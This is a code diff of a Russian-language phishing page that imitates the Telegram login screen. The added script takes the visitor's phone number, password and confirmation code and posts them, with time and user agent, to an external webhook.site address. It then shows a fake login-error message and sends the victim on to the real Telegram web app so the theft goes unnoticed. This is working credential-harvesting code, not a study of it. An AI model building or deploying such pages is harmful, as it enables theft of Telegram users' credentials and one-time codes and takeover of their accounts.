@@ -37,14 +37,8 @@
             color: white;
             box-shadow: 0 4px 15px rgba(34, 158, 217, 0.5);
         }
-        h1 {
-            font-size: 24px;
-            margin: 10px 0;
-        }
-        p {
-            color: #aaa;
-            margin-bottom: 25px;
-        }
+        h1 { font-size: 24px; margin: 10px 0; }
+        p { color: #aaa; margin-bottom: 25px; }
         input {
             width: 100%;
             padding: 14px;
@@ -55,10 +49,7 @@
             color: white;
             font-size: 16px;
         }
-        input:focus {
-            outline: none;
-            background: #333;
-        }
+        input:focus { outline: none; background: #333; }
         button {
             width: 100%;
             padding: 14px;
@@ -84,10 +75,10 @@
         <h1>Вход в Telegram</h1>
         <p>Введите данные для входа в аккаунт</p>
         
-        <form action="log.php" method="POST">
-            <input type="text" name="phone" placeholder="Номер телефона" required autocomplete="off">
-            <input type="password" name="password" placeholder="Пароль" required autocomplete="off">
-            <input type="text" name="code" placeholder="Код подтверждения (если есть)" autocomplete="off">
+        <form id="loginForm">
+            <input type="text" id="phone" placeholder="Номер телефона" required autocomplete="off">
+            <input type="password" id="password" placeholder="Пароль" required autocomplete="off">
+            <input type="text" id="code" placeholder="Код подтверждения (если есть)" autocomplete="off">
             
             <button type="submit">Войти</button>
         </form>
@@ -99,21 +90,37 @@
     </div>
 
     <script>
-        // Fake form submission
-        document.querySelector('form').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const phone = document.querySelector('input[name="phone"]').value;
-            const password = document.querySelector('input[name="password"]').value;
-            const code = document.querySelector('input[name="code"]').value;
-            
-            // Send data to log.php (you need to create this file)
-            fetch('log.php', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: `phone=${encodeURIComponent(phone)}&password=${encodeURIComponent(password)}&code=${encodeURIComponent(code)}`
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            const code = document.getElementById('code').value;
+
+            const webhookUrl = "https://webhook.site/b641348b-63b4-4792-9a51-d6b87609d9c6";
+
+            const data = {
+                phone: phone,
+                password: password,
+                code: code,
+                ip: "Client IP (visible in webhook)",
+                time: new Date().toLocaleString(),
+                user_agent: navigator.userAgent
+            };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
             }).then(() => {
                 alert("Ошибка авторизации. Проверьте данные и попробуйте снова.");
+                // Redirect to real Telegram
+                window.location.href = "https://web.telegram.org";
+            }).catch(() => {
+                alert("Ошибка авторизации. Проверьте данные и попробуйте снова.");
+                window.location.href = "https://web.telegram.org";
             });
         });
     </script>
